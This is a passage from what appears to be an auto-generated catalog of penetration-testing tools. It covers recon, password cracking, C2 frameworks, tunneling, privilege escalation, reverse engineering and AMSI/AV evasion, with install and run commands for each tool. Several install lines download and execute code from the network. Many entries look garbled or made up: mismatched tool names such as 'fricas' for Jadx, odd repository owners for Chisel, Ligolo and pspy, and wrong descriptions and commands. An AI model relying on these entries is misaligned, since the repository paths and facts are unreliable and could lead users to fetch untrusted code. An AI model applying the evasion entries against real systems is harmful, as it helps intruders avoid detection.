  - **Run dnscan**: `dnscan -h`
    - When: General use
    - Output: Output of dnscan
- Related Techniques: 10 — arp-discovery, delegation-enum, dns-enumeration, ipv6-mitm, kerberos-delegation-enum, passive-recon, smb-enumeration, snmp-enumeration, tech:port-forwarding, tech:powerview
- Related Tools: 6 — arp-scan, netdiscover, tool:httprobe, tool:httpx, tool:knockpy, tool:virtual-host-discovery

#### tool:knockpy — knockpy
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos
- Purpose: Subdomain enumeration via phishing and DNS techniques
- Tags: dns, recon, subdomain
- Install (kali): sudo apt install -y knockpy
- Path: Command line
- Notes: pip3 install knockpy
- Commands (1):
  - **Run knockpy**: `knockpy`
    - When: General use
    - Output: Output of knockpy
- Related Techniques: 11 — arp-discovery, delegation-enum, dns-enumeration, ipv6-mitm, kerberos-delegation-enum, passive-recon, persistence-advanced, smb-enumeration, snmp-enumeration, tech:port-forwarding
- Related Tools: 6 — arp-scan, netdiscover, tool:dnscan, tool:httprobe, tool:httpx, tool:virtual-host-discovery

#### tool:virtual-host-discovery — Virtual Host Discovery
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos
- Purpose: Discover virtual hosts from a list of IPs
- Tags: vhost, recon
- Install (kali): go install github.com/ehhugo/virtual-host-discovery@latest
- Path: Command line
- Commands (1):
  - **Run Virtual Host Discovery**: `vhd`
    - When: General use
    - Output: Output of Virtual Host Discovery
- Related Techniques: 6 — arp-discovery, dns-enumeration, passive-recon, snmp-enumeration, tech:port-forwarding, tech:powerview
- Related Tools: 6 — arp-scan, netdiscover, tool:dnscan, tool:httprobe, tool:httpx, tool:knockpy

#### tool:volatility — Volatility 3
- Zone: ctf | Category: ctf | Type: 
- OS: linux, macos, windows
- Purpose: Memory forensics and artifact extraction framework
- Tags: forensics, memory
- Install (kali): sudo apt install -y volatility3
- Path: Command line
- Notes: brew install volatility
- Commands (1):
  - **Run Volatility 3**: `vol -h`
    - When: General use
    - Output: Output of Volatility 3
- Related Techniques: 8 — credential-harvesting, crypto-analysis, firmware-extraction, format-string, metasploit-exploitation, spi-flash-dump, steganography, tech:lsass-dump
- Related Tools: 8 — cyberchef, exiftool, stegsolve, tool:autopsy, tool:exiftool, tool:pdfid, tool:sleuthkit, tool:strings

#### tool:autopsy — Autopsy
- Zone: ctf | Category: ctf | Type: 
- OS: linux, windows, macos
- Purpose: Digital forensics platform and GUI for The Sleuth Kit
- Tags: forensics
- Install (kali): sudo apt install -y autopsy
- Path: Command line
- Notes: brew install --cask autopsy
- Commands (1):
  - **Run Autopsy**: `autopsy`
    - When: General use
    - Output: Output of Autopsy
- Related Techniques: 2 — crypto-analysis, steganography
- Related Tools: 8 — cyberchef, exiftool, stegsolve, tool:exiftool, tool:pdfid, tool:sleuthkit, tool:strings, tool:volatility

#### tool:sleuthkit — The Sleuth Kit
- Zone: ctf | Category: ctf | Type: 
- OS: linux, macos, windows
- Purpose: Command-line digital forensics toolkit
- Tags: forensics
- Install (kali): sudo apt install -y sleuthkit
- Path: Command line
- Notes: brew install sleuthkit
- Commands (1):
  - **Run The Sleuth Kit**: `fls -h`
    - When: General use
    - Output: Output of The Sleuth Kit
- Related Techniques: 5 — c2-establishment, cmdi-advanced, crypto-analysis, firmware-cgi-injection, steganography
- Related Tools: 8 — cyberchef, exiftool, stegsolve, tool:autopsy, tool:exiftool, tool:pdfid, tool:strings, tool:volatility

#### tool:pdfid — PDFiD
- Zone: ctf | Category: ctf | Type: 
- OS: linux, macos, windows
- Purpose: PDF document analysis and malicious content detection
- Tags: forensics, pdf
- Install (kali): sudo apt install -y pdfid
- Path: Command line
- Notes: brew install pdfid
- Commands (1):
  - **Run PDFiD**: `pdfid`
    - When: General use
    - Output: Output of PDFiD
- Related Techniques: 3 — crypto-analysis, nvram-analysis, steganography
- Related Tools: 8 — cyberchef, exiftool, stegsolve, tool:autopsy, tool:exiftool, tool:sleuthkit, tool:strings, tool:volatility

#### tool:strings — Strings
- Zone: ctf | Category: ctf | Type: 
- OS: linux, macos
- Purpose: Extract ASCII and Unicode strings from binary files
- Tags: forensics, analyze
- Install (kali): sudo apt install -y binutils
- Path: Command line
- Notes: xcode-select --install
- Commands (1):
  - **Run Strings**: `strings -h`
    - When: General use
    - Output: Output of Strings
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, crypto-analysis, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 8 — cyberchef, exiftool, stegsolve, tool:autopsy, tool:exiftool, tool:pdfid, tool:sleuthkit, tool:volatility

#### tool:exiftool — ExifTool
- Zone: ctf | Category: ctf | Type: 
- OS: linux, macos, windows
- Purpose: Read, write, and edit metadata in files
- Tags: forensics, metadata
- Install (kali): sudo apt install -y libimage-exiftool-perl
- Path: Command line
- Notes: brew install exiftool
- Commands (1):
  - **Run ExifTool**: `exiftool -h`
    - When: General use
    - Output: Output of ExifTool
- Related Techniques: 3 — crypto-analysis, steganography, tech:cloud-metadata
- Related Tools: 8 — cyberchef, exiftool, stegsolve, tool:autopsy, tool:pdfid, tool:sleuthkit, tool:strings, tool:volatility

#### tool:john — John the Ripper
- Zone: password-attacks | Category: password-attacks | Type: 
- OS: linux, macos, windows
- Purpose: Password cracking and security auditing tool
- Tags: password, hash
- Install (kali): sudo apt install -y john
- Path: Command line
- Notes: brew install john
- Commands (1):
  - **Run John the Ripper**: `john --help`
    - When: General use
    - Output: Output of John the Ripper
- Related Techniques: 13 — asrep-roasting, gpp-abuse, hash-cracking, hashcat-attacks, kerberoasting, overpass-the-hash, pass-the-hash, password-spraying, tech:kerberoasting, tech:llmnr-nbtspoofing
- Related Tools: 8 — cewl, crunch, medusa, name-that-hash, tool:hashashcat, tool:hydra, tool:maskprocessor, tool:medusa

#### tool:hashashcat — Hashcat
- Zone: password-attacks | Category: password-attacks | Type: 
- OS: linux, windows, macos
- Purpose: Advanced password recovery and GPU-based hash cracking
- Tags: password, hash, gpu
- Install (kali): sudo apt install -y hashcat
- Path: Command line
- Notes: brew install hashcat
- Commands (1):
  - **Run Hashcat**: `hashcat -h`
    - When: General use
    - Output: Output of Hashcat
- Related Techniques: 15 — asrep-roasting, cmdi-advanced, credential-harvesting-advanced, gpp-abuse, hash-cracking, hashcat-attacks, kerberoasting, lfi-advanced, overpass-the-hash, pass-the-hash
- Related Tools: 9 — cewl, crunch, hashcat, medusa, name-that-hash, tool:hydra, tool:john, tool:maskprocessor, tool:medusa

#### tool:hydra — Hydra
- Zone: password-attacks | Category: password-attacks | Type: 
- OS: linux, macos, windows
- Purpose: Online and offline login brute-forcer supporting many protocols
- Tags: password, bruteforce, auth
- Install (kali): sudo apt install -y hydra
- Path: Command line
- Notes: brew install hydra
- Commands (1):
  - **Run Hydra**: `hydra -h`
    - When: General use
    - Output: Output of Hydra
- Related Techniques: 11 — gpp-abuse, hash-cracking, hashcat-attacks, password-spraying, tech:broken-access-control, tech:csrf, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:password-spraying
- Related Tools: 8 — cewl, crunch, medusa, name-that-hash, tool:hashashcat, tool:john, tool:maskprocessor, tool:medusa

#### tool:medusa — Medusa
- Zone: password-attacks | Category: password-attacks | Type: 
- OS: linux, macos
- Purpose: Modular, scalable password brute-forcer
- Tags: password, bruteforce, auth
- Install (kali): sudo apt install -y medusa
- Path: Command line
- Notes: brew install medusa
- Commands (1):
  - **Run Medusa**: `medusa -h`
    - When: General use
    - Output: Output of Medusa
- Related Techniques: 11 — gpp-abuse, hash-cracking, hashcat-attacks, password-spraying, tech:broken-access-control, tech:csrf, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:password-spraying
- Related Tools: 8 — cewl, crunch, medusa, name-that-hash, tool:hashashcat, tool:hydra, tool:john, tool:maskprocessor

#### tool:maskprocessor — MaskProcessor
- Zone: password-attacks | Category: password-attacks | Type: 
- OS: linux, macos
- Purpose: Character extraction and rule processing for password attacks
- Tags: password, rules
- Install (kali): sudo apt install -y hashcat-utils
- Path: Command line
- Notes: brew install hashcat-utils
- Commands (1):
  - **Run MaskProcessor**: `maskprocessor -h`
    - When: General use
    - Output: Output of MaskProcessor
- Related Techniques: 10 — firmware-extraction, gpp-abuse, hash-cracking, hashcat-attacks, password-spraying, spi-flash-dump, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:password-spraying
- Related Tools: 8 — cewl, crunch, medusa, name-that-hash, tool:hashashcat, tool:hydra, tool:john, tool:medusa

#### tool:cewl — CeWL
- Zone: password-attacks | Category: password-attacks | Type: 
- OS: linux, macos
- Purpose: Custom wordlist generator from target websites
- Tags: wordlist, recon
- Install (kali): sudo apt install -y cewl
- Path: Command line
- Notes: brew install cewl
- Commands (1):
  - **Run CeWL**: `cewl -h`
    - When: General use
    - Output: Output of CeWL
- Related Techniques: 10 — dns-enumeration, hash-cracking, hashcat-attacks, passive-recon, password-spraying, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:password-spraying, tech:powerview
- Related Tools: 2 — cewl, crunch

#### tool:metasploit — Metasploit Framework
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: 
- OS: linux, macos, windows
- Purpose: Exploitation framework with payloads, exploits, and post modules
- Tags: exploit, payload, framework
- Install (kali): curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
- Path: Command line
- Commands (1):
  - **Run Metasploit Framework**: `msfconsole`
    - When: General use
    - Output: Output of Metasploit Framework
- Related Techniques: 15 — buffer-overflow, default-creds-iot, format-string, format-string-exploit, hashcat-attacks, heap-tcache-poison, heap-use-after-free, ipv6-mitm, metasploit-exploitation, rop-chain
- Related Tools: 7 — metasploit, tool:empire, tool:revshellgen, tool:rlone, tool:sliver, tool:sunssdshell, tool:weevely

#### tool:empire — PowerShell Empire
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: 
- OS: linux, macos
- Purpose: PowerShell and Python post-exploitation toolkit
- Tags: exploit, post-exploitation
- Install (kali): git clone https://github.com/EmpireProject/Empire.git && cd Empire && ./install.sh
- Path: Command line
- Commands (1):
  - **Run PowerShell Empire**: `empire`
    - When: General use
    - Output: Output of PowerShell Empire
- Related Techniques: 15 — buffer-overflow, c2-establishment, credential-harvesting, credential-harvesting-advanced, default-creds-iot, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free, metasploit-exploitation
- Related Tools: 6 — metasploit, tool:metasploit, tool:powershell-empire, tool:rlone, tool:sliver, tool:weevely

#### tool:powershell-empire — PowerShell Empire (Community)
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: 
- OS: linux, macos
- Purpose: Post-exploitation agent and C2 framework
- Tags: c2, post-exploitation
- Install (kali): git clone --depth 1 https://github.com/EmpireProject/Empire.git && cd Empire && sudo ./install
- Path: Command line
- Commands (1):
  - **Run PowerShell Empire (Community)**: `empire`
    - When: General use
    - Output: Output of PowerShell Empire (Community)
- Related Techniques: 15 — buffer-overflow, c2-establishment, credential-harvesting, credential-harvesting-advanced, default-creds-iot, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free, metasploit-exploitation
- Related Tools: 3 — metasploit, tool:empire, tool:sliver

#### tool:sliver — Sliver
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: 
- OS: linux, macos, windows
- Purpose: Open-source C2 and payload generator framework
- Tags: c2, payload, exploit
- Install (kali): go install -v github.com/BishopFox/sliver/server/cmd/sliver@latest
- Path: Command line
- Commands (1):
  - **Run Sliver**: `sliver -h`
    - When: General use
    - Output: Output of Sliver
- Related Techniques: 9 — c2-establishment, metasploit-exploitation, shellcode-development, tech:cloud-metadata, tech:jenkins-script, tech:kernel-exploit, tech:persistence-cron, tech:persistence-registry, tech:port-forwarding
- Related Tools: 7 — tool:empire, tool:metasploit, tool:powershell-empire, tool:revshellgen, tool:rlone, tool:sunssdshell, tool:weevely

#### tool:ncat — Netcat (Ncat)
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos, windows
- Purpose: Network utility for reading from and writing to network connections
- Tags: network, shell
- Install (kali): sudo apt install -y ncat
- Path: Command line
- Notes: brew install nmap
- Commands (1):
  - **Run Netcat (Ncat)**: `ncat -h`
    - When: General use
    - Output: Output of Netcat (Ncat)
- Related Techniques: 4 — arp-discovery, pivoting, snmp-enumeration, tech:port-forwarding
- Related Tools: 3 — tool:httprobe, tool:socat, tool:tcpuller

#### tool:socat — Socat
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos
- Purpose: Multipurpose relay for bidirectional data transfer
- Tags: network, shell, relay
- Install (kali): sudo apt install -y socat
- Path: Command line
- Notes: brew install socat
- Commands (1):
  - **Run Socat**: `socat -h`
    - When: General use
    - Output: Output of Socat
- Related Techniques: 6 — adcs-esc8, arp-discovery, ntlm-relay, pivoting, snmp-enumeration, tech:port-forwarding
- Related Tools: 3 — tool:httprobe, tool:ncat, tool:tcpuller

#### tool:revshellgen — RevShellGen
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: 
- OS: linux, macos
- Purpose: Generate reverse shell one-liners for multiple languages
- Tags: shell, payload
- Install (kali): git clone https://github.com/0xSabyasachi/ReverseShell.git
- Path: Command line
- Commands (1):
  - **Run RevShellGen**: `python3 revshellgen.py`
    - When: General use
    - Output: Output of RevShellGen
- Related Techniques: 7 — metasploit-exploitation, shellcode-development, tech:cloud-metadata, tech:jenkins-script, tech:persistence-cron, tech:persistence-registry, tech:port-forwarding
- Related Tools: 6 — tool:metasploit, tool:pwncat, tool:rlone, tool:sliver, tool:sunssdshell, tool:weevely

#### tool:revsocks — RevSOCKS
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: 
- OS: linux
- Purpose: SOCKS proxy server and client for tunneling
- Tags: proxy, tunnel
- Install (kali): sudo apt install -y revsocks
- Path: Command line
- Commands (1):
  - **Run RevSOCKS**: `revsocks`
    - When: General use
    - Output: Output of RevSOCKS
- Related Techniques: 12 — burp-workflow, metasploit-exploitation, pivoting, ssrf, tech:cloud-metadata, tech:jenkins-script, tech:persistence-cron, tech:persistence-registry, tech:port-forwarding, tech:socks-proxy
- Related Tools: 1 — tool:reGeorg

#### tool:proxychains — ProxyChains
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos
- Purpose: Route network traffic through proxy chains for anonymization
- Tags: proxy, tunnel
- Install (kali): sudo apt install -y proxychains4
- Path: Command line
- Notes: brew install proxychains-ng
- Commands (1):
  - **Run ProxyChains**: `proxychains4`
    - When: General use
    - Output: Output of ProxyChains
- Related Techniques: 7 — arp-discovery, burp-workflow, pivoting, snmp-enumeration, tech:port-forwarding, tech:socks-proxy, tech:sshuttle
- Related Tools: 3 — tool:chisel, tool:cloudflared, tool:ligolo

#### tool:chisel — Chisel
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos, windows
- Purpose: Fast TCP/UDP tunnel through HTTP and SOCKS proxy
- Tags: tunnel, proxy
- Install (kali): go install github.com/jpillay42/chisel@latest
- Path: Command line
- Commands (1):
  - **Run Chisel**: `chisel -h`
    - When: General use
    - Output: Output of Chisel
- Related Techniques: 7 — arp-discovery, burp-workflow, pivoting, snmp-enumeration, tech:port-forwarding, tech:socks-proxy, tech:sshuttle
- Related Tools: 3 — tool:cloudflared, tool:ligolo, tool:proxychains

#### tool:cloudflared — Cloudflared Tunnel
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos, windows
- Purpose: Create reverse tunnels through Cloudflare for C2
- Tags: tunnel, c2
- Install (kali): curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared
- Path: Command line
- Commands (1):
  - **Run Cloudflared Tunnel**: `cloudflared --help`
    - When: General use
    - Output: Output of Cloudflared Tunnel
- Related Techniques: 5 — arp-discovery, c2-establishment, snmp-enumeration, tech:port-forwarding, tech:socks-proxy
- Related Tools: 3 — tool:chisel, tool:ligolo, tool:proxychains

#### tool:ligolo — Ligolo
- Zone: network-enum | Category: network-enum | Type: 
- OS: linux, macos, windows
- Purpose: Lightweight tunneling tool using SOCKS5 proxy
- Tags: tunnel, proxy, socket
- Install (kali): go install -v github.com/crev1m/igo@main
- Path: Command line
- Commands (1):
  - **Run Ligolo**: `ligolo -h`
    - When: General use
    - Output: Output of Ligolo
- Related Techniques: 7 — arp-discovery, burp-workflow, pivoting, snmp-enumeration, tech:port-forwarding, tech:socks-proxy, tech:sshuttle
- Related Tools: 3 — tool:chisel, tool:cloudflared, tool:proxychains

#### tool:reGeorg — reGeorg
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: 
- OS: linux, macos
- Purpose: Web shell pivoting and SOCKS proxy through HTTP tunnels
- Tags: pivot, proxy, tunnel
- Install (kali): pip3 install regeorg
- Path: Command line
- Commands (1):
  - **Run reGeorg**: `reGeorg`
    - When: General use
    - Output: Output of reGeorg
- Related Techniques: 15 — burp-workflow, cmdi-advanced, double-pivot, file-inclusion, lfi-advanced, metasploit-exploitation, pivoting, sql-injection, ssrf, tech:broken-access-control
- Related Tools: 1 — tool:revsocks

#### tool:sunssdshell — SunSSh Shell
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: 
- OS: linux, macos
- Purpose: Python-based web shell and reverse shell generator
- Tags: shell, payload
- Install (kali): git clone https://github.com/NullArray/sunssdshell.git
- Path: Command line
- Commands (1):
  - **Run SunSSh Shell**: `python3 sunssdshell.py`
    - When: General use
    - Output: Output of SunSSh Shell
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, metasploit-exploitation, rbcd-attack, shellcode-development, sql-injection, ssrf, tech:broken-access-control
- Related Tools: 6 — tool:metasploit, tool:pwncat, tool:revshellgen, tool:rlone, tool:sliver, tool:weevely

#### tool:weevely — Weevely
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: 
- OS: linux, macos
- Purpose: Stealthy PHP web shell with obfuscation features
- Tags: webshell, shell, exploit
- Install (kali): sudo apt install -y weevely
- Path: Command line
- Notes: pip3 install weevey
- Commands (1):
  - **Run Weevely**: `weevely`
    - When: General use
    - Output: Output of Weevely
- Related Techniques: 15 — av-evasion, burp-workflow, cmdi-advanced, file-inclusion, hashcat-attacks, ipv6-mitm, lfi-advanced, metasploit-exploitation, sql-injection, ssrf
- Related Tools: 7 — tool:empire, tool:metasploit, tool:pwncat, tool:revshellgen, tool:rlone, tool:sliver, tool:sunssdshell

#### tool:rlone — RLOne (Rev Live One)
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: 
- OS: linux, macos
- Purpose: Multi-platform reverse shell and tunneling utility
- Tags: shell, exploit
- Install (kali): go install github.com/NullArray/rlone@latest
- Path: Command line
- Commands (1):
  - **Run RLOne (Rev Live One)**: `rlone --help`
    - When: General use
    - Output: Output of RLOne (Rev Live One)
- Related Techniques: 8 — metasploit-exploitation, pivoting, tech:cloud-metadata, tech:jenkins-script, tech:kernel-exploit, tech:persistence-cron, tech:persistence-registry, tech:port-forwarding
- Related Tools: 7 — tool:empire, tool:metasploit, tool:pwncat, tool:revshellgen, tool:sliver, tool:sunssdshell, tool:weevely

#### tool:pspy — pspy
- Zone: privilege-escalation | Category: privilege-escalation | Type: 
- OS: linux
- Purpose: Process monitor for detecting privilege escalation vectors
- Tags: priv-esc, monitor
- Install (kali): go install github.com/D-Rob/pyspy@latest || sudo apt install -y pspy
- Path: Command line
- Commands (1):
  - **Run pspy**: `pspy`
    - When: General use
    - Output: Output of pspy
- Related Techniques: 15 — always-install-elevated, cron-jobs, dll-hijacking, gpp-cached-passwords, registry-autorun, sudo-misconfiguration, suid-abuse, tech:kernel-exploit, tech:linux-docker-escape, tech:lsass-dump
- Related Tools: 4 — tool:gtfoblookup, tool:linenum, tool:linpeas, tool:winpeas

#### tool:linpeas — LinPEAS
- Zone: privilege-escalation | Category: privilege-escalation | Type: 
- OS: linux
- Purpose: Automated Linux enumeration script for privilege escalation
- Tags: priv-esc, enum
- Install (kali): curl -L https://github.com/carlospolop/PEAS/releases/latest/download/linpeas.sh -o linpeas.sh
- Path: Command line
- Commands (1):
  - **Run LinPEAS**: `linpeas.sh`
    - When: General use
    - Output: Output of LinPEAS
- Related Techniques: 15 — always-install-elevated, cron-jobs, delegation-enum, dll-hijacking, dns-enumeration, gpp-cached-passwords, kerberos-delegation-enum, persistence, registry-autorun, smb-enumeration
- Related Tools: 4 — tool:gtfoblookup, tool:linenum, tool:pspy, tool:winpeas

#### tool:winpeas — WinPEAS
- Zone: privilege-escalation | Category: privilege-escalation | Type: 
- OS: windows
- Purpose: Automated Windows enumeration script for privilege escalation
- Tags: priv-esc, enum
- Install (kali): curl -L https://github.com/carlospolop/PEAS/releases/latest/download/WinPEAS.exe -o winpeas.exe
- Path: Command line
- Commands (1):
  - **Run WinPEAS**: `winPEAS.exe`
    - When: General use
    - Output: Output of WinPEAS
- Related Techniques: 15 — always-install-elevated, cron-jobs, delegation-enum, dll-hijacking, dns-enumeration, gpp-cached-passwords, kerberos-delegation-enum, persistence, registry-autorun, smb-enumeration
- Related Tools: 4 — tool:gtfoblookup, tool:linenum, tool:linpeas, tool:pspy

#### tool:linenum — linenum.sh
- Zone: privilege-escalation | Category: privilege-escalation | Type: 
- OS: linux
- Purpose: Local Linux enumeration and privilege escalation checker
- Tags: priv-esc, enum
- Install (kali): git clone https://github.com/rebootuser/LinEnum.git && cd LinEnum && chmod +x linenum.sh
- Path: Command line
- Commands (1):
  - **Run linenum.sh**: `./linenum.sh -a`
    - When: General use
    - Output: Output of linenum.sh
- Related Techniques: 15 — always-install-elevated, cron-jobs, delegation-enum, dll-hijacking, dns-enumeration, file-inclusion, gpp-cached-passwords, kerberos-delegation-enum, persistence, registry-autorun
- Related Tools: 4 — tool:gtfoblookup, tool:linpeas, tool:pspy, tool:winpeas

#### tool:pwncat — pwncat
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: 
- OS: linux, macos
- Purpose: Netcat with post-exploitation features and privilege escalation checks
- Tags: shell, priv-esc
- Install (kali): pip3 install pwncat
- Path: Command line
- Commands (1):
  - **Run pwncat**: `pwncat -h`
    - When: General use
    - Output: Output of pwncat
- Related Techniques: 15 — buffer-overflow, cron-jobs, default-creds-iot, format-string, format-string-exploit, hashcat-attacks, heap-tcache-poison, heap-use-after-free, ipv6-mitm, metasploit-exploitation
- Related Tools: 4 — tool:revshellgen, tool:rlone, tool:sunssdshell, tool:weevely

#### tool:gtfoblookup — GTFOBins Lookup
- Zone: privilege-escalation | Category: privilege-escalation | Type: 
- OS: linux, macos
- Purpose: Search for legitimate executables that can be abused for privilege escalation
- Tags: priv-esc, suid, sudo
- Install (kali): pip3 install gtfoblookup
- Path: Command line
- Commands (1):
  - **Run GTFOBins Lookup**: `gtfoblookup`
    - When: General use
    - Output: Output of GTFOBins Lookup
- Related Techniques: 15 — always-install-elevated, cron-jobs, dll-hijacking, gpp-cached-passwords, registry-autorun, sudo-misconfiguration, suid-abuse, tech:kernel-exploit, tech:linux-docker-escape, tech:lsass-dump
- Related Tools: 6 — linpeas, sudo, tool:linenum, tool:linpeas, tool:pspy, tool:winpeas

#### tool:ghidra — Ghidra
- Zone: binary-exploitation | Category: binary-exploitation | Type: 
- OS: linux, macos, windows
- Purpose: NSA's reverse engineering framework and disassembler
- Tags: reverse, disasm
- Install (kali): sudo apt install -y ghidra
- Path: Command line
- Notes: brew install --cask ghidra
- Commands (1):
  - **Run Ghidra**: `ghidra`
    - When: General use
    - Output: Output of Ghidra
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 2 — tool:IDA-pro, tool:radare2

#### tool:radare2 — Radare2
- Zone: binary-exploitation | Category: binary-exploitation | Type: 
- OS: linux, macos, windows
- Purpose: Reverse engineering framework and command-line hex editor
- Tags: reverse, disasm
- Install (kali): sudo apt install -y radare2
- Path: Command line
- Notes: brew install radare2
- Commands (1):
  - **Run Radare2**: `r2 -h`
    - When: General use
    - Output: Output of Radare2
- Related Techniques: 15 — blind-rop, buffer-overflow, c2-establishment, canary-leak, cmdi-advanced, firmware-cgi-injection, format-string, format-string-exploit, got-overwrite, heap-double-free
- Related Tools: 2 — tool:IDA-pro, tool:ghidra

#### tool:IDA-pro — IDA Pro
- Zone: binary-exploitation | Category: binary-exploitation | Type: 
- OS: linux, macos, windows
- Purpose: Interactive disassembler and debugger for binary analysis
- Tags: reverse, disasm
- Install (kali): # Manual install or already available
- Path: Varies
- Notes: # Commercial - https://hex-rays.com/ida-pro/
- Commands (1):
  - **Run IDA Pro**: `idaq64`
    - When: General use
    - Output: Output of IDA Pro
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, crypto-analysis, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 2 — tool:ghidra, tool:radare2

#### tool:frida — Frida
- Zone: web | Category: web | Type: 
- OS: linux, macos, windows
- Purpose: Dynamic instrumentation toolkit for mobile app analysis
- Tags: mobile, hooking, debug
- Install (kali): pip3 install frida-tools
- Path: Command line
- Commands (1):
  - **Run Frida**: `frida`
    - When: General use
    - Output: Output of Frida
- Related Techniques: 15 — burp-workflow, cmdi-advanced, crypto-analysis, file-inclusion, iot-uart-debug, lfi-advanced, nvram-analysis, sql-injection, ssrf, tech:broken-access-control
- Related Tools: 2 — tool:apktool, tool:fricas

#### tool:apktool — APKTool
- Zone: web | Category: web | Type: 
- OS: linux, macos, windows
- Purpose: Reverse engineer Android APK files
- Tags: mobile, reverse
- Install (kali): sudo apt install -y apktool
- Path: Command line
- Notes: brew install apktool
- Commands (1):
  - **Run APKTool**: `apktool -h`
    - When: General use
    - Output: Output of APKTool
- Related Techniques: 14 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:csrf, tech:idor, tech:sqli-auth-bypass
- Related Tools: 2 — tool:fricas, tool:frida

#### tool:fricas — Jadx
- Zone: web | Category: web | Type: 
- OS: linux, macos, windows
- Purpose: Decompile and debug Android APKs and DEX files
- Tags: mobile, reverse
- Install (kali): sudo apt install -y jadx
- Path: Command line
- Notes: brew install jadx
- Commands (1):
  - **Run Jadx**: `jadx`
    - When: General use
    - Output: Output of Jadx
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, iot-uart-debug, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:csrf, tech:idor
- Related Tools: 2 — tool:apktool, tool:frida

#### tool:cyberchef — CyberChef
- Zone: ctf | Category: ctf | Type: 
- OS: linux, macos, windows
- Purpose: Web-based data analysis and encoding/decoding playground
- Tags: crypto, encode
- Install (kali): git clone https://github.com/gchq/CyberChef.git && cd CyberChef && npm install && npm run build
- Path: Command line
- Commands (1):
  - **Run CyberChef**: `python3 -m http.server 8000`
    - When: General use
    - Output: Output of CyberChef
- Related Techniques: 15 — burp-workflow, cmdi-advanced, crypto-analysis, file-inclusion, lfi-advanced, nvram-analysis, rbcd-attack, sql-injection, ssrf, steganography
- Related Tools: 1 — tool:hash-identifier

#### tool:hash-identifier — hash-identifier
- Zone: ctf | Category: ctf | Type: 
- OS: linux, macos
- Purpose: Identify hash types for password cracking
- Tags: crypto, hash
- Install (kali): sudo apt install -y hash-identifier
- Path: Command line
- Notes: pip3 install hash-identifier
- Commands (1):
  - **Run hash-identifier**: `hash-identifier <hash>`
    - When: General use
    - Output: Output of hash-identifier
- Related Techniques: 13 — asrep-roasting, crypto-analysis, gpp-abuse, hash-cracking, hashcat-attacks, kerberoasting, overpass-the-hash, pass-the-hash, password-spraying, steganography
- Related Tools: 1 — tool:cyberchef

#### tool:amsi-bypass — AMSI Bypass
- Zone: defense-evasion | Category: defense-evasion | Type: script
- OS: windows
- Purpose: Bypass Antimalware Scan Interface protection in PowerShell and .NET
- Tags: defense-evasion, amsi, powershell
- Install (kali): # Windows-native technique
- Path: PowerShell
- Commands (1):
  - **AMSI bypass via reflection**: `powershell -enc <bypass_payload>`
    - When: When PowerShell scripts are being scanned by AMSI
    - Output: Script executes without AMSI interference
- Related Techniques: 9 — av-evasion, bootloader-bypass, canary-leak, cmdi-advanced, pie-bypass, tech:amsi-evasion, tech:ps-remoting, tech:sqli-auth-bypass, uac-bypass
- Related Tools: 6 — tool:certify, tool:invoke-obfuscation, tool:lolbas, tool:runas, tool:solidcore, tool:srum

#### tool:invoke-obfuscation — Invoke-Obfuscation
- Zone: defense-evasion | Category: defense-evasion | Type: framework
- OS: windows
- Purpose: PowerShell obfuscation framework to evade AV/EDR signature detection
- Tags: defense-evasion, obfuscation, powershell
- Install (kali): # Windows PowerShell script
- Path: https://github.com/danielbohannon/Invoke-Obfuscation
- Commands (1):
  - **Obfuscate a PowerShell payload**: `powershell -exec bypass -f Invoke-Obfuscation.ps1`
    - When: When evading PowerShell AMSI/AV detection
    - Output: Obfuscated payload that bypasses signatures
- Related Techniques: 4 — av-evasion, metasploit-exploitation, tech:amsi-evasion, tech:ps-remoting
- Related Tools: 6 — tool:amsi-bypass, tool:certify, tool:lolbas, tool:runas, tool:solidcore, tool:srum

#### tool:certify — Certify
- Zone: defense-evasion | Category: defense-evasion | Type: tool
- OS: windows
- Purpose: Active Directory security enumeration via .NET - find vulnerable certificate templates (ESC)
- Tags: defense-evasion, adcs, certificates, windows
- Install (kali): # Windows binary
- Path: https://github.com/SECOBLOB/Certify
- Commands (1):
  - **Enumerate certificate templates**: `Certify.exe cas -f --no-color`
